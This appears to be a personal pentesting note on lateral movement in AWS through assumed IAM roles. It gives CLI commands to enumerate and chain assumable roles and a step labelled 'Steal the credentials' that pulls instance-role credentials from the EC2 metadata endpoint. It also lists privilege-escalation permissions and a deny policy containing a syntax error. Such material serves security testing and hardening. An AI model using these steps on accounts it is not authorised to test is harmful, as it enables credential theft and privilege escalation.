---
is_a: "[[note]]"
of: "[[hacking aws]]"
---
# Notes
The standard way for services in one AWS account to do things in another AWS account is for a service to "assume a role" in the other account. It's elegant when done well. But it's so pervasive that it can easily become a tangled mess, and exploitable, making it a primary method of lateral movement within AWS accounts.

Potential weaknesses:
* If used in a build pipeline to create and deploy code artifacts, it may be possible to cross accounts with admin access. Deployment systems need full access to create and delete any AWS resource.
* Developers and admins frequently add themselves into assume role policies for testing and debugging. Getting even a limited user account could lead to elevated privileges.
* Service providers have roles to monitor and manage accounts, and typically ask for overly broad access.

## Understanding who can assume a role
AWS Console: View IAM roles, select a role and look at the "Trust relationships" tab
AWS CLI:
```
aws iam list-roles
```

Each role has a AssumeRolePolicyDocument, described at [AWS::IAM::Role - AWS CloudFormation](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-iam-role.html). This has a series of Statements, that say who can assume this role, and how. In each statement is a Principal, which is the who. There are three types of principals.

### AWS principals
These are user and roles in this AWS account or a different AWS account, and should be scrutinized closely.

### Service principals
Confusingly named, this is the way that AWS itself does things in your account. To launch an instance, you need to give the AWS EC2 service permission to attach your role to the instance. For hacking purposes, all service principals can be ignored.

### Federated principals
Non-AWS identity providers such as SAML. Not as common as AWS principals, but should definately be looked at.

## Wildcard principals
Principals can't use wildcards, but there is a convention to say "all users in an account" using the keyword **root**. Amazon's note
:
> The suffix root in the policy’s Principal attribute equates to “authenticated and authorized principals in the account,” not the special and all-powerful root user principal that is created when an AWS account is created.

Like:
```
"Principal": {
  "AWS": "arn:aws:iam::111122223333:root"
}
```

## Permissions needed to assume a role
To successfully assume a role, two things are needed.
* A AssumeRolePolicyDocument on the role letting principals assume it
* Permissions in your current role to do a STS assume-role

Typically, for pentesting, the second isn't much of a worry, since both are typically set up at the same time.

## Chaining assume roles
Assuming a role may give access to assume a different role. So assume roles can be chained to hop through several to get to a desired role.

## Pentesting Assume Roles
* Run ```aws iam list-roles``` in all accounts to find roles that can be assumed.
* Search through the AssumeRolePolicyDocument statements for **AWS** or **Federated** principals for roles that can be assumed.
* See if you have access to any of those roles.
* If not, search each role to see who can assume **that** role. Keep searching backwards until you find a role you use to start from.
* Assume roles, chaining as needed to get to your desired role.
* If you get a permissions error, check permissions for that user or role for the IAM assume-role permission. Backtrack as needed to find another role to start from.

## Useful commands
Get roles in account that can be assumed (only AWS principals though)
```
aws iam list-roles | jq -r '.Roles[] | select((.AssumeRolePolicyDocument.Statement[].Principal.AWS? | length) > 0) | { RoleName: .RoleName, AssumeRole: .AssumeRolePolicyDocument.Statement[].Principal.AWS}'
```

Assuming a role. The role session name is a required field but can be anything.
```
aws sts assume-role --role-arn "arn:aws:iam::123456789012:role/example-role" --role-session-name AWSCLI-Session
```

### get-account-authorization-details
The get-account-authorization-details command returns all users, roles and policies, basically everything that's needed to hack accounts.
```
aws iam get-account-authorization-details
```

## Assume role via .aws/config file
Using EC2 IAM role
```
[target-role]
role_arn = arn:aws:iam::222222222222:role/efgh
credential_source = Ec2InstanceMetadata
```
then
```
aws sts get-caller-identity --profile target-role
```

## Assume role using EC2 Instance Profiles
* Find the InstanceProfileArn for the target role

```
aws iam list-instance-profiles-for-role --role-name my-target-role
```
* Launch an instance. Needs a lot of info to launch correctly
```
aws ec2 run-instances \
    --image-id $AMI_ID \
    --instance-type $INSTANCE_TYPE \
    --count 1 \
    --subnet-id $SUBNETID \
    --key-name $KEYPAIR_NAME \
    --security-group-ids $SECURITY_GROUPS \
    --iam-instance-profile "Arn=${INSTANCEPROFILE_ARN}" \
    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pentest}]'
```
* Steal the credentials
```
hostname
aws sts get-caller-identity
curl -s http://169.254.169.254/latest/meta-data/iam/info/

export ROLE_NAME=`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`
echo "Instance role is ${ROLE_NAME}"
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}/
```

Not sure how instance credentials are different
```
curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

 Escalation Permissions
These are permissions that allow privilege escalation, though some are limited or require special circumstances.

From [Investigating Privilege Escalation Methods in AWS | Bishop Fox](https://bishopfox.com/blog/privilege-escalation-in-aws)
```
iam:CreatePolicyVersion
iam:SetDefaultPolicyVersion
iam:PassRole and ec2:RunInstances
iam:CreateAccessKey
iam:CreateLoginProfile
iam:UpdateLoginProfile
iam:AttachUserPolicy
iam:AttachGroupPolicy
iam:AttachRolePolicy
iam:PutUserPolicy
iam:PutGroupPolicy
iam:PutRolePolicy
iam:AddUserToGroup
iam:UpdateAssumeRolePolicy
iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction
iam:PassRole, lambda:CreateFunction,and lambda:CreateEventSourceMapping
lambda:UpdateFunctionCode
iam:PassRole, glue:CreateDevEndpoint, and glue:GetDevEndpoint(s)
glue:UpdateDevEndpoint and glue:GetDevEndpoint(s)
iam:PassRole, cloudformation:CreateStack,and cloudformation:DescribeStacks
iam:PassRole, datapipeline:CreatePipeline,datapipeline:PutPipelineDefinition, and datapipeline:ActivatePipeline
```

Additional risky permissions
```
iam:CreateRole
iam:CreateUser
sts:AssumeRole
```

Summarized
```
iam:AddUserToGroup
iam:AttachGroupPolicy
iam:AttachRolePolicy
iam:AttachUserPolicy
iam:CreateAccessKey
iam:CreateLoginProfile
iam:CreatePolicyVersion
iam:CreateRole
iam:CreateUser
iam:PassRole
iam:PutGroupPolicy
iam:PutRolePolicy
iam:PutUserPolicy
iam:SetDefaultPolicyVersion
iam:UpdateAssumeRolePolicy
iam:UpdateLoginProfile
lambda:UpdateFunctionCode
sts:AssumeRole
```

If Passrole is needed, remove these permissions as well
```
ec2:RunInstances
lambda:CreateFunction
lambda:InvokeFunction
lambda:CreateEventSourceMapping
glue:CreateDevEndpoint
glue:GetDevEndpoint(s)
cloudformation:CreateStack
datapipeline:CreatePipeline
datapipeline:PutPipelineDefinition
datapipeline:ActivatePipeline
```

Policy to prevent
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "RiskyPermissions",
            "Effect": "Deny","",
            "Action": [
				"iam:AddUserToGroup",
				"iam:AttachGroupPolicy",
				"iam:AttachRolePolicy",
				"iam:AttachUserPolicy",
				"iam:CreateAccessKey",
				"iam:CreateLoginProfile",
				"iam:CreatePolicyVersion",
				"iam:CreateRole",
				"iam:CreateUser",
				"iam:PassRole",
				"iam:PutGroupPolicy",
				"iam:PutRolePolicy",
				"iam:PutUserPolicy",
				"iam:SetDefaultPolicyVersion",
				"iam:UpdateAssumeRolePolicy",
				"iam:UpdateLoginProfile",
				"lambda:UpdateFunctionCode",
				"sts:AssumeRole"
            ],
            "Resource": "*"
        },
        {
            "Sid": "RiskyPassRolePermissions",
            "Effect": "Deny","",
            "Action": [
				"ec2:RunInstances",
				"lambda:CreateFunction",
				"lambda:InvokeFunction",
				"lambda:CreateEventSourceMapping",
				"glue:CreateDevEndpoint",
				"glue:GetDevEndpoint(s)",
				"cloudformation:CreateStack",
				"datapipeline:CreatePipeline",
				"datapipeline:PutPipelineDefinition",
				"datapipeline:ActivatePipeline"
            ],
            "Resource": "*"
        }
    ]
}
```

## References
* [How to use trust policies with IAM roles](https://aws.amazon.com/blogs/security/how-to-use-trust-policies-with-iam-roles/)
* [AWS JSON policy elements: Principal - AWS Identity and Access Management](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_principal.html)
* [Investigating Privilege Escalation Methods in AWS | Bishop Fox](https://bishopfox.com/blog/privilege-escalation-in-aws)
* [iam-vulnerable | BishopFox](https://github.com/BishopFox/iam-vulnerable)
* [AWS IAM Privilege Escalation – Methods and Mitigation](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [AWS IAM Privilege Escalation Techniques - Hacking The Cloud](https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/)
* [Auditing passrole](https://ermetic.com/blog/aws/auditing-passrole-a-problematic-privilege-escalation-permission/)
